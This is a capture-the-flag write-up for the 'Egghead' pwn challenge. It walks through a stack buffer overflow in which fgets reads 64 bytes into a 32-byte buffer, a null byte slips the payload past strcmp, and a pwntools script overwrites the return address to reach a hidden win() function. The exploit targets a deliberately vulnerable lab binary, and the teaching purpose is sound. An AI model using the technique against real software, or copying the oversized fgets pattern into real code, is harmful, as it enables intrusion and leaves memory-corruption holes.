---
title: "bkctf — Exploiting Stack Buffer Overflow"
date: 2024-02-22
categories: [CTF, bkctf]
tags: [pwn, buffer-overflow, stack, ret2win, pwntools, python]
description: Exploiting a stack buffer overflow to redirect execution to a hidden win() function.
math: false
mermaid: false
pin: false
---

**Challenge name:** Egghead

**Category:** Pwn

## Challenge Description

We're given a binary called `egghead` along with its source code. The program asks you to name a movie in a loop, and only accepts one answer:

> "Name a movie."

## Initial Analysis

Looking at the source, there are two interesting things right away.

First, there's a `win()` function that opens a file called `flag` and prints its contents — but it's **never called** anywhere in the program:

```c
void win() {
    puts("getittwisted:");
    FILE *f = fopen("flag", "r");
    int c;
    while ((c = fgetc(f)) != EOF) putchar(c);
    putchar('\n');
}
```

Second, the `name()` function has a classic buffer overflow:

```c
void name() {
    char answer[32];
    while (1) {
        puts("Name a movie.");
        printf("> ");
        fgets(answer, MAX_ANSWER_LEN, stdin);  // reads 64 bytes into a 32-byte buffer!
        answer[strcspn(answer, "\n")] = '\0';
        if (strcmp(answer, "Happy Gilmore") == 0) {
            puts("Now that's cinema.");
            return;
        }
        puts("Not cinema.");
    }
}
```

`answer` is 32 bytes, but `MAX_ANSWER_LEN` is 64 — so `fgets` will happily read 32 bytes past the end of the buffer, straight into the saved return address on the stack.

## Stack Layout

When `name()` is executing, the stack looks like this:

```
High addresses
┌─────────────────────────┐
│     saved return addr   │  ← overwrite this with win()
├─────────────────────────┤
│     saved RBP           │  ← 8 bytes
├─────────────────────────┤
│     answer[0..31]       │  ← our input starts here
└─────────────────────────┘
Low addresses
```

`fgets` writes upward from `answer[0]`, so writing past 32 bytes runs directly into saved RBP and then the return address. When `name()` hits its `return`, the CPU loads that address — which we've replaced with `win()`.

## Bypassing strcmp

There's a subtlety: the overflow only matters if `name()` actually returns, which only happens when `strcmp(answer, "Happy Gilmore") == 0`. So we need our payload to simultaneously pass the string check *and* overflow the buffer.

The trick is that `strcmp` stops at the first null byte `\x00`, while `fgets` reads the full 64 bytes regardless. So we craft our payload as:

```
"Happy Gilmore\x00" + padding + address of win()
```

`strcmp` sees `"Happy Gilmore"` and is satisfied. `fgets` has already written the entire payload including the overwritten return address.

## Finding the Win Address

The binary is x86-64 but we were working on an ARM machine, so we couldn't run it directly. We used pwntools to extract the symbol address:

```bash
python3 -c "from pwn import *; e = ELF('./egghead'); print(hex(e.symbols['win']))"
# 0x401236
```

Since the binary is not PIE, this address is fixed and identical on the remote server every run — no ASLR concerns.

## Working Out the Padding

Using GDB on a locally compiled ARM version of the binary, we inspected the stack frame of `name()`:

```
x30 at 0xffffffffeca8   ← saved return address
locals at 0xffffffffeca0
```

The buffer sits 40 bytes below the saved return address (`x30`), giving us:

- 13 bytes: `"Happy Gilmore"`
- 1 byte: `\x00` null terminator
- 26 bytes: padding to reach 40 bytes total
- 8 bytes: address of `win()`

## The Exploit

The challenge uses an instancer that generates a unique host per session, served over SSL on port 1337. The final exploit:

```python
from pwn import *

WIN_ADDR = 0x401236

p = remote('egghead-<instance-id>.instancer.batmans.kitchen', 1337, ssl=True)

payload  = b'Happy Gilmore'
payload += b'\x00'
payload += b'A' * 26
payload += p64(WIN_ADDR)

p.sendlineafter(b'> ', payload)
p.interactive()
```

Running this gives:

```
[+] Opening connection to egghead-<instance-id>.instancer.batmans.kitchen on port 1337: Done
[*] Switching to interactive mode
Now that's cinema.
getittwisted:
bkctf{hit73m_wi7h_th3_br4in_d3s7r0y3r}
```

`name()` returns into `win()`, which prints the flag.

## Flag

`bkctf{hit73m_wi7h_th3_br4in_d3s7r0y3r}`

## Key Takeaways

- `fgets` with an oversized length argument is a classic and dangerous buffer overflow source.
- `strcmp` only reads up to the first null byte, so a payload can simultaneously satisfy a string check and overflow the buffer past it.
- When a binary is not PIE, function addresses are fixed — no leak needed for a simple ret2win.
- If you're on a different architecture than the target binary, pwntools' `ELF()` can still parse symbols without executing the binary.